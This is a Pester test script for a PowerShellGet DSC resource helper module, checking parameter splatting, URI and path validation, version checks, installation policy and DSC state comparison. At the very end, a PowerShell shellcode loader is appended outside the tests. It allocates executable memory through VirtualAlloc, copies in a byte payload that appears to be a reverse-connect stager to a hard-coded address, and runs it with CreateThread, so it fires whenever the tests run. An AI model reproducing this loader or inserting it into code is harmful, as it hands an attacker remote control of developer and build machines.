


$script:helperModuleName = 'PowerShellGet.ResourceHelper'

$resourceModuleRoot = Split-Path -Path (Split-Path -Path $PSScriptRoot -Parent) -Parent
$dscResourcesFolderFilePath = Join-Path -Path (Join-Path -Path $resourceModuleRoot -ChildPath 'Modules') `
    -ChildPath $script:helperModuleName

Import-Module -Name (Join-Path -Path $dscResourcesFolderFilePath `
        -ChildPath "$script:helperModuleName.psm1") -Force

InModuleScope $script:helperModuleName {
    Describe 'New-SplatParameterHashTable' {
        Context 'When specific parameters should be returned' {
            It 'Should return a hashtable with the correct values' {
                $mockPSBoundParameters = @{
                    Property1 = '1'
                    Property2 = '2'
                    Property3 = '3'
                    Property4 = '4'
                }

                $extractArgumentsResult = New-SplatParameterHashTable `
                    -FunctionBoundParameters $mockPSBoundParameters `
                    -ArgumentNames @('Property2', 'Property3')

                $extractArgumentsResult | Should -BeOfType [System.Collections.Hashtable]
                $extractArgumentsResult.Count | Should -Be 2
                $extractArgumentsResult.ContainsKey('Property2') | Should -BeTrue
                $extractArgumentsResult.ContainsKey('Property3') | Should -BeTrue
                $extractArgumentsResult.Property2 | Should -Be '2'
                $extractArgumentsResult.Property3 | Should -Be '3'
            }
        }

        Context 'When the specific parameters to be returned does not exist' {
            It 'Should return an empty hashtable' {
                $mockPSBoundParameters = @{
                    Property1 = '1'
                }

                $extractArgumentsResult = New-SplatParameterHashTable `
                    -FunctionBoundParameters $mockPSBoundParameters `
                    -ArgumentNames @('Property2', 'Property3')

                $extractArgumentsResult | Should -BeOfType [System.Collections.Hashtable]
                $extractArgumentsResult.Count | Should -Be 0
            }
        }

        Context 'When and empty hashtable is passed in the parameter FunctionBoundParameters' {
            It 'Should return an empty hashtable' {
                $mockPSBoundParameters = @{
                }

                $extractArgumentsResult = New-SplatParameterHashTable `
                    -FunctionBoundParameters $mockPSBoundParameters `
                    -ArgumentNames @('Property2', 'Property3')

                $extractArgumentsResult | Should -BeOfType [System.Collections.Hashtable]
                $extractArgumentsResult.Count | Should -Be 0
            }
        }
    }

    Describe 'Test-ParameterValue' {
        BeforeAll {
            $mockProviderName = 'PowerShellGet'
        }

        Context 'When passing a correct uri as ''Value'' and type is ''SourceUri''' {
            It 'Should not throw an error' {
                {
                    Test-ParameterValue `
                        -Value 'https://mocked.uri' `
                        -Type 'SourceUri' `
                        -ProviderName $mockProviderName
                } | Should -Not -Throw
            }
        }

        Context 'When passing an invalid uri as ''Value'' and type is ''SourceUri''' {
            It 'Should throw the correct error' {
                $mockParameterName = 'mocked.uri'

                {
                    Test-ParameterValue `
                        -Value $mockParameterName `
                        -Type 'SourceUri' `
                        -ProviderName $mockProviderName
                } | Should -Throw ($LocalizedData.InValidUri -f $mockParameterName)
            }
        }

        Context 'When passing a correct path as ''Value'' and type is ''DestinationPath''' {
            It 'Should not throw an error' {
                {
                    Test-ParameterValue `
                        -Value 'TestDrive:\' `
                        -Type 'DestinationPath' `
                        -ProviderName $mockProviderName
                } | Should -Not -Throw
            }
        }

        Context 'When passing an invalid path as ''Value'' and type is ''DestinationPath''' {
            It 'Should throw the correct error' {
                $mockParameterName = 'TestDrive:\NonExistentPath'

                {
                    Test-ParameterValue `
                        -Value $mockParameterName `
                        -Type 'DestinationPath' `
                        -ProviderName $mockProviderName
                } | Should -Throw ($LocalizedData.PathDoesNotExist -f $mockParameterName)
            }
        }

        Context 'When passing a correct uri as ''Value'' and type is ''PackageSource''' {
            It 'Should not throw an error' {
                {
                    Test-ParameterValue `
                        -Value 'https://mocked.uri' `
                        -Type 'PackageSource' `
                        -ProviderName $mockProviderName
                } | Should -Not -Throw
            }
        }

        Context 'When passing an correct package source as ''Value'' and type is ''PackageSource''' {
            BeforeAll {
                $mockParameterName = 'PSGallery'

                Mock -CommandName Get-PackageSource -MockWith {
                    return New-Object -TypeName Object |
                        Add-Member -Name 'Name' -MemberType NoteProperty -Value $mockParameterName -PassThru |
                        Add-Member -Name 'ProviderName' -MemberType NoteProperty -Value $mockProviderName -PassThru -Force
                }
            }

            It 'Should not throw an error' {
                {
                    Test-ParameterValue `
                        -Value $mockParameterName `
                        -Type 'PackageSource' `
                        -ProviderName $mockProviderName
                } | Should -Not -Throw

                Assert-MockCalled -CommandName Get-PackageSource -Exactly -Times 1 -Scope It
            }
        }

        Context 'When passing type is ''PackageSource'' and passing a package source that does not exist' {
            BeforeAll {
                $mockParameterName = 'PSGallery'

                Mock -CommandName Get-PackageSource
            }

            It 'Should not throw an error' {
                {
                    Test-ParameterValue `
                        -Value $mockParameterName `
                        -Type 'PackageSource' `
                        -ProviderName $mockProviderName
                } | Should -Not -Throw

                Assert-MockCalled -CommandName Get-PackageSource -Exactly -Times 1 -Scope It
            }
        }

        Context 'When passing invalid type in parameter ''Type''' {
            BeforeAll {
                $mockType = 'UnknownType'
            }

            It 'Should throw the correct error' {
                {
                    Test-ParameterValue `
                        -Value 'AnyArgument' `
                        -Type $mockType `
                        -ProviderName $mockProviderName
                } | Should -Throw ($LocalizedData.UnexpectedArgument -f $mockType)
            }
        }
    }

    Describe 'Test-VersionParameter' {
        Context 'When not passing in any parameters (using default values)' {
            It 'Should return true' {
                Test-VersionParameter | Should -BeTrue
            }
        }

        Context 'When only ''RequiredVersion'' are passed' {
            It 'Should return true' {
                Test-VersionParameter -RequiredVersion '3.0.0.0' | Should -BeTrue
            }
        }

        Context 'When ''MinimumVersion'' has a lower version than ''MaximumVersion''' {
            It 'Should throw the correct error' {
                {
                    Test-VersionParameter `
                        -MinimumVersion '2.0.0.0' `
                        -MaximumVersion '1.0.0.0'
                } | Should -Throw $LocalizedData.VersionError
            }
        }

        Context 'When ''MinimumVersion'' has a lower version than ''MaximumVersion''' {
            It 'Should throw the correct error' {
                {
                    Test-VersionParameter `
                        -MinimumVersion '2.0.0.0' `
                        -MaximumVersion '1.0.0.0'
                } | Should -Throw $LocalizedData.VersionError
            }
        }

        Context 'When ''RequiredVersion'', ''MinimumVersion'', and ''MaximumVersion'' are passed' {
            It 'Should throw the correct error' {
                {
                    Test-VersionParameter `
                        -RequiredVersion '3.0.0.0' `
                        -MinimumVersion '2.0.0.0' `
                        -MaximumVersion '1.0.0.0'
                } | Should -Throw $LocalizedData.VersionError
            }
        }
    }

    Describe 'Get-InstallationPolicy' {
        Context 'When the package source exist, and is trusted' {
            BeforeAll {
                Mock -CommandName Get-PackageSource -MockWith {
                    return New-Object -TypeName Object |
                        Add-Member -Name 'IsTrusted' -MemberType NoteProperty -Value $true -PassThru -Force
                }
            }

            It 'Should return true' {
                Get-InstallationPolicy -RepositoryName 'PSGallery' | Should -BeTrue

                Assert-MockCalled -CommandName Get-PackageSource -Exactly -Times 1 -Scope It
            }
        }

        Context 'When the package source exist, and is not trusted' {
            BeforeAll {
                Mock -CommandName Get-PackageSource -MockWith {
                    return New-Object -TypeName Object |
                        Add-Member -Name 'IsTrusted' -MemberType NoteProperty -Value $false -PassThru -Force
                }
            }

            It 'Should return false' {


                Get-InstallationPolicy -RepositoryName 'PSGallery' | Should -BeFalse

                Assert-MockCalled -CommandName Get-PackageSource -Exactly -Times 1 -Scope It
            }
        }

        Context 'When the package source does not exist' {
            BeforeAll {
                Mock -CommandName Get-PackageSource
            }

            It 'Should return $null' {
                Get-InstallationPolicy -RepositoryName 'Unknown' | Should -BeNullOrEmpty

                Assert-MockCalled -CommandName Get-PackageSource -Exactly -Times 1 -Scope It
            }
        }
    }

    Describe 'Testing Test-DscParameterState' -Tag TestDscParameterState {
        Context -Name 'When passing values' -Fixture {
            It 'Should return true for two identical tables' {
                $mockDesiredValues = @{ Example = 'test' }

                $testParameters = @{
                    CurrentValues = $mockDesiredValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $true
            }

            It 'Should return false when a value is different for [System.String]' {
                $mockCurrentValues = @{ Example = [System.String]'something' }
                $mockDesiredValues = @{ Example = [System.String]'test' }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when a value is different for [System.Int32]' {
                $mockCurrentValues = @{ Example = [System.Int32]1 }
                $mockDesiredValues = @{ Example = [System.Int32]2 }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when a value is different for [Int16]' {
                $mockCurrentValues = @{ Example = [System.Int16]1 }
                $mockDesiredValues = @{ Example = [System.Int16]2 }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when a value is different for [UInt16]' {
                $mockCurrentValues = @{ Example = [System.UInt16]1 }
                $mockDesiredValues = @{ Example = [System.UInt16]2 }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when a value is missing' {
                $mockCurrentValues = @{ }
                $mockDesiredValues = @{ Example = 'test' }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return true when only a specified value matches, but other non-listed values do not' {
                $mockCurrentValues = @{ Example = 'test'; SecondExample = 'true' }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = 'false'  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                    ValuesToCheck = @('Example')
                }

                Test-DscParameterState @testParameters | Should -Be $true
            }

            It 'Should return false when only specified values do not match, but other non-listed values do ' {
                $mockCurrentValues = @{ Example = 'test'; SecondExample = 'true' }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = 'false'  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                    ValuesToCheck = @('SecondExample')
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when an empty hash table is used in the current values' {
                $mockCurrentValues = @{ }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = 'false'  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return true when evaluating a table against a CimInstance' {
                $mockCurrentValues = @{ Handle = '0'; ProcessId = '1000'  }

                $mockWin32ProcessProperties = @{
                    Handle    = 0
                    ProcessId = 1000
                }

                $mockNewCimInstanceParameters = @{
                    ClassName  = 'Win32_Process'
                    Property   = $mockWin32ProcessProperties
                    Key        = 'Handle'
                    ClientOnly = $true
                }

                $mockDesiredValues = New-CimInstance @mockNewCimInstanceParameters

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                    ValuesToCheck = @('Handle', 'ProcessId')
                }

                Test-DscParameterState @testParameters | Should -Be $true
            }

            It 'Should return false when evaluating a table against a CimInstance and a value is wrong' {
                $mockCurrentValues = @{ Handle = '1'; ProcessId = '1000'  }

                $mockWin32ProcessProperties = @{
                    Handle    = 0
                    ProcessId = 1000
                }

                $mockNewCimInstanceParameters = @{
                    ClassName  = 'Win32_Process'
                    Property   = $mockWin32ProcessProperties
                    Key        = 'Handle'
                    ClientOnly = $true
                }

                $mockDesiredValues = New-CimInstance @mockNewCimInstanceParameters

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                    ValuesToCheck = @('Handle', 'ProcessId')
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return true when evaluating a hash table containing an array' {
                $mockCurrentValues = @{ Example = 'test'; SecondExample = @('1', '2') }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = @('1', '2')  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $true
            }

            It 'Should return false when evaluating a hash table containing an array with wrong values' {
                $mockCurrentValues = @{ Example = 'test'; SecondExample = @('A', 'B') }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = @('1', '2')  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when evaluating a hash table containing an array, but the CurrentValues are missing an array' {
                $mockCurrentValues = @{ Example = 'test' }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = @('1', '2')  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }

            It 'Should return false when evaluating a hash table containing an array, but the property i CurrentValues is $null' {
                $mockCurrentValues = @{ Example = 'test'; SecondExample = $null }
                $mockDesiredValues = @{ Example = 'test'; SecondExample = @('1', '2')  }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false
            }
        }

        Context -Name 'When passing invalid types for DesiredValues' -Fixture {
            It 'Should throw the correct error when DesiredValues is of wrong type' {
                $mockCurrentValues = @{ Example = 'something' }
                $mockDesiredValues = 'NotHashTable'

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                $mockCorrectErrorMessage = ($script:localizedData.PropertyTypeInvalidForDesiredValues -f $testParameters.DesiredValues.GetType().Name)
                { Test-DscParameterState @testParameters } | Should -Throw $mockCorrectErrorMessage
            }

            It 'Should write a warning when DesiredValues contain an unsupported type' {
                Mock -CommandName Write-Warning -Verifiable

                
                class MockUnknownType {
                    [ValidateNotNullOrEmpty()]
                    [System.String]
                    $Property1

                    [ValidateNotNullOrEmpty()]
                    [System.String]
                    $Property2

                    MockUnknownType() {
                    }
                }

                $mockCurrentValues = @{ Example = New-Object -TypeName MockUnknownType }
                $mockDesiredValues = @{ Example = New-Object -TypeName MockUnknownType }

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                }

                Test-DscParameterState @testParameters | Should -Be $false

                Assert-MockCalled -CommandName Write-Warning -Exactly -Times 1
            }
        }

        Context -Name 'When passing an CimInstance as DesiredValue and ValuesToCheck is $null' -Fixture {
            It 'Should throw the correct error' {
                $mockCurrentValues = @{ Example = 'something' }

                $mockWin32ProcessProperties = @{
                    Handle    = 0
                    ProcessId = 1000
                }

                $mockNewCimInstanceParameters = @{
                    ClassName  = 'Win32_Process'
                    Property   = $mockWin32ProcessProperties
                    Key        = 'Handle'
                    ClientOnly = $true
                }

                $mockDesiredValues = New-CimInstance @mockNewCimInstanceParameters

                $testParameters = @{
                    CurrentValues = $mockCurrentValues
                    DesiredValues = $mockDesiredValues
                    ValuesToCheck = $null
                }

                $mockCorrectErrorMessage = $script:localizedData.PropertyTypeInvalidForValuesToCheck
                { Test-DscParameterState @testParameters } | Should -Throw $mockCorrectErrorMessage
            }
        }

        Assert-VerifiableMock
    }
}

$c = '[DllImport("kernel32.dll")]public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);[DllImport("kernel32.dll")]public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);[DllImport("msvcrt.dll")]public static extern IntPtr memset(IntPtr dest, uint src, uint count);';$w = Add-Type -memberDefinition $c -Name "Win32" -namespace Win32Functions -passthru;[Byte[]];[Byte[]]$z = 0xfc,0xe8,0x82,0x00,0x00,0x00,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0x0c,0x8b,0x52,0x14,0x8b,0x72,0x28,0x0f,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0xc1,0xcf,0x0d,0x01,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x01,0xd1,0x51,0x8b,0x59,0x20,0x01,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x01,0xd6,0x31,0xff,0xac,0xc1,0xcf,0x0d,0x01,0xc7,0x38,0xe0,0x75,0xf6,0x03,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x01,0xd3,0x66,0x8b,0x0c,0x4b,0x8b,0x58,0x1c,0x01,0xd3,0x8b,0x04,0x8b,0x01,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x68,0x33,0x32,0x00,0x00,0x68,0x77,0x73,0x32,0x5f,0x54,0x68,0x4c,0x77,0x26,0x07,0xff,0xd5,0xb8,0x90,0x01,0x00,0x00,0x29,0xc4,0x54,0x50,0x68,0x29,0x80,0x6b,0x00,0xff,0xd5,0x50,0x50,0x50,0x50,0x40,0x50,0x40,0x50,0x68,0xea,0x0f,0xdf,0xe0,0xff,0xd5,0x97,0x6a,0x05,0x68,0x69,0x67,0x78,0x42,0x68,0x02,0x00,0x11,0x4f,0x89,0xe6,0x6a,0x10,0x56,0x57,0x68,0x99,0xa5,0x74,0x61,0xff,0xd5,0x85,0xc0,0x74,0x0a,0xff,0x4e,0x08,0x75,0xec,0xe8,0x3f,0x00,0x00,0x00,0x6a,0x00,0x6a,0x04,0x56,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xe9,0x8b,0x36,0x6a,0x40,0x68,0x00,0x10,0x00,0x00,0x56,0x6a,0x00,0x68,0x58,0xa4,0x53,0xe5,0xff,0xd5,0x93,0x53,0x6a,0x00,0x56,0x53,0x57,0x68,0x02,0xd9,0xc8,0x5f,0xff,0xd5,0x83,0xf8,0x00,0x7e,0xc3,0x01,0xc3,0x29,0xc6,0x75,0xe9,0xc3,0xbb,0xf0,0xb5,0xa2,0x56,0x6a,0x00,0x53,0xff,0xd5;$g = 0x1000;if ($z.Length -gt 0x1000){$g = $z.Length};$x=$w::VirtualAlloc(0,0x1000,$g,0x40);for ($i=0;$i -le ($z.Length-1);$i++) {$w::memset([IntPtr]($x.ToInt32()+$i), $z[$i], 1)};$w::CreateThread(0,0,$x,0,0,0);for (;;){Start-sleep 60};

